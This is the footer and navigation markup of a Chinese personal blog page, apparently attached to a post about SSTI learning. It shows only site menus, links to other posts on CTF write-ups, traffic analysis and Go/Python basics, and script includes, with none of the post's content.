class="item posts"><a href="/archives/"><span class="count">63</span> <span class="name">文章</span></a></div><div class="item categories"><a href="/categories/"><span class="count">12</span> <span class="name">分类</span></a></div><div class="item tags"><a href="/tags/"><span class="count">7</span> <span class="name">标签</span></a></div></nav><div class="social"></div><ul class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首页</a></li><li class="item"><a href="/about/" rel="section"><i class="ic i-user"></i>关于</a></li><li class="item dropdown"><a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a><ul class="submenu"><li class="item"><a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a></li><li class="item"><a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a></li><li class="item"><a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a></li></ul></li><li class="item"><a href="/friends/" rel="section"><i class="ic i-heart"></i>friends</a></li><li class="item"><a href="/links/" rel="section"><i class="ic i-magic"></i>links</a></li></ul></div></div></div><ul id="quick"><li class="prev pjax"><a href="/2024/04/16/Socket%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/2024/04/16/TLS%E6%B5%81%E9%87%8F%E8%A7%A3%E5%AF%86/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>随机文章</h2><ul><li class="item"><div class="breadcrumb"><a href="/categories/GO/" title="分类于 GO">GO</a></div><span><a href="/2024/04/16/go%E8%AF%AD%E8%A8%80%E5%8F%98%E9%87%8F/" title="go语言变量">go语言变量</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Misc/" title="分类于 Misc">Misc</a> <i class="ic i-angle-right"></i> <a href="/categories/MISC/" title="分类于 MISC">MISC</a> <i class="ic i-angle-right"></i> <a href="/categories/Misc/course-1/" title="分类于 比赛wp">比赛wp</a></div><span><a href="/2024/04/16/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91C0deX%E6%88%98%E9%98%9FWP/" title="西湖论剑C0deX战队WP">西湖论剑C0deX战队WP</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/WEB/" title="分类于 WEB">WEB</a></div><span><a href="/2024/04/16/CTFshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" title="CTFshow命令执行">CTFshow命令执行</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/MISC/" title="分类于 MISC">MISC</a></div><span><a href="/2024/04/16/NewStarCTF2023%20MiscWEEK1/" title="NewStarCTF2023Misc week1">NewStarCTF2023Misc week1</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/MISC/" title="分类于 MISC">MISC</a></div><span><a href="/2024/04/16/TrueCrypt%E8%A7%A3%E5%AF%86/" title="TrueCrypt解密">TrueCrypt解密</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/GO/" title="分类于 GO">GO</a></div><span><a href="/2024/04/16/go%E8%AF%AD%E8%A8%80%E5%88%9D%E5%AD%A6/" title="go语言初学">go语言初学</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/MISC/" title="分类于 MISC">MISC</a></div><span><a href="/2024/04/16/NewStarCTF2023%20MiscWEEK4/" title="NewStarCTF2023Misc week4">NewStarCTF2023Misc week4</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/GO/" title="分类于 GO">GO</a></div><span><a href="/2024/04/16/go%E8%AF%AD%E8%A8%80%E5%8F%98%E9%87%8F%E4%BD%9C%E7%94%A8%E5%9F%9F/" title="go语言变量作用域">go语言变量作用域</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E6%B5%81%E9%87%8F/" title="分类于 流量">流量</a> <i class="ic i-angle-right"></i> <a href="/categories/%E6%B5%81%E9%87%8F/course-2/" title="分类于 流量分析">流量分析</a></div><span><a href="/2024/04/16/%E5%93%A5%E6%96%AF%E6%8B%89v4.01%E6%B5%81%E9%87%8F%E6%B5%85%E6%9E%90/" title="哥斯拉v4.01流量浅析">哥斯拉v4.01流量浅析</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/python/" title="分类于 python">python</a></div><span><a href="/2024/04/16/Python%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E5%A4%84%E7%90%86/" title="Python学习------文件处理">Python学习------文件处理</a></span></li></ul></div><div><h2>最新评论</h2><ul class="leancloud-recent-comment"></ul></div></div><div class="status"><div class="copyright">&copy; 2010 – <span itemprop="copyrightYear">2024</span> <span class="with-love"><i class="ic i-sakura rotate"></i> </span><span class="author" itemprop="copyrightHolder">nnnpc @ nnnpc's Blog</span></div><div class="powered-by">基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL={path:"2024/04/16/SSTI学习/",favicon:{show:"（●´3｀●）やれやれだぜ",hide:"(´Д｀)大変だ！"},search:{placeholder:"文章搜索",empty:"关于 「 ${query} 」，什么也没搜到",stats:"${time} ms 内找到 ${hits} 条结果"},valine:!0,fancybox:!0,copyright:'复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',ignores:[function(e){return e.includes("#")},function(e){return new RegExp(LOCAL.path+"$").test(e)}]}</script><script src="https://cdn.polyfill.io/v2/polyfill.js"></script><script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script><script src="/js/app.js?v=0.2.5"></script></body></html>